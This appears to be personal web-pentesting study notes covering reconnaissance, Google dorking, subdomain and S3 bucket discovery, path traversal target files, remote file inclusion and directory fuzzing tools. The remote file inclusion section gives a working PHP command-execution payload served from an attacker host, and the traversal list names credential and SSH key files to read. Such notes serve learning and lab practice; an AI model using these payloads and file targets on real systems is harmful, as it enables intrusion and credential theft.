## Discover Favicon

1. Find favicon endpoint in page source
2. Curl to check md5 hash value
3. Check Favicon framework -> https://wiki.owasp.org/index.php/OWASP_favicon_database

Example of curl:
```
$ curl https://<domain_name>/sites/favicon/images/favicon.ico | md5sum
```

## Worth to check

To find endpoints:
* robots.txt
* sitemap.xml

To find frameworks versions:
* curl with verbose (-v)
* Wappalyzer

To find subdomains:
* https://crt.sh
* https://transparencyreport.google.com/https/certificates
* Google dorking, eg:
```
-site:www.tryhackme.com site:*.tryhackme.com
```
* dnsrecon
* Sublist3r

Google Dorking:
* site:<domain_name> -> returns results only from the specified website address
* inurl:admin -> returns results that have the specified word in the URL
* filetype:pdf -> returns results which are a particular file extension
* intitle:admin -> returns results that contain the specified word in the title
LINK: https://en.wikipedia.org/wiki/Google_hacking

Wayback Machine -> https://archive.org/web/

S3 Bucket - AWS storage
```
http(s)://{name}.s3.amazonaws.com
eg. {name}-assets, {name}-www, {name}-public, {name}-private
```
---
## Path Traversal (Directory traversal/dot-dot-slash attack)

Allows an attacker to read operating system resources, such as local files on the server running an application


#### Interesting paths:
* /etc/issue - contains a message or system identification to be printed before the login prompt.
* /etc/profile - controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
* /proc/version - specifies the version of the Linux kernel
* /etc/passwd - has all registered user that has access to a system
* /etc/shadow - contains information about the system's users' passwords
* /root/.bash_history - contains the history commands for root user
* /var/log/dmessage - contains global system messages, including the messages that are logged during system startup
* /var/mail/root - all emails for root user
* /root/.ssh/id_rsa - Private SSH keys for a root or any known valid user on the server
* /var/log/apache2/access.log - the accessed requests for Apache  webserver
* C:\boot.ini - Windows, contains the boot options for computers with BIOS firmware
---

## Local File Inclusion (﻿LFI)

---
## Remote File Inclusion (RFI)

Occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function
* PHP -> the allow_url_fopen option needs to be on

Allow an attacker to gain Remote Command Execution (RCE) on the server. 
Consequences of a successful RFI attack:
* Sensitive Information Disclosure
* Cross-site Scripting (XSS)
* Denial of Service (DoS)

### PHP example

1. Create a file hack.txt with this content:
   ```
   <?PHP print exec('whoami'); ?>
   ```
2. Create a server using Python
   ```
   $ python3 –m http.server <port>
   ```
3. Include in URL:
   ```
   http://example.com/index.php?file=http://<IP>:<port>/hack.txt
   ```


---
## Automation

The best wordlists:
https://github.com/danielmiessler/SecLists

### Tools

#### FFUF
Endpoints
```
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.0.138/FUZZ
```

Virtual Hosts
The above command uses the -w switch to specify the wordlist we are going to use. 
The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword 
in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
```
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.<domain_name>" -u http://<IP_address>
```
Add `-fs {size}` to list only records with most often used `size`.

#### DIRB
```
$ dirb http://10.10.0.138/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```
#### GOBUSTER
```
$ gobuster dir --url http://10.10.0.138/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

#### DNSRECON
```
$ dnsrecon -t brt -d <domain_name>
```

#### Sublist3r
```
$ ./sublis3r.py -d <domain_name>
```

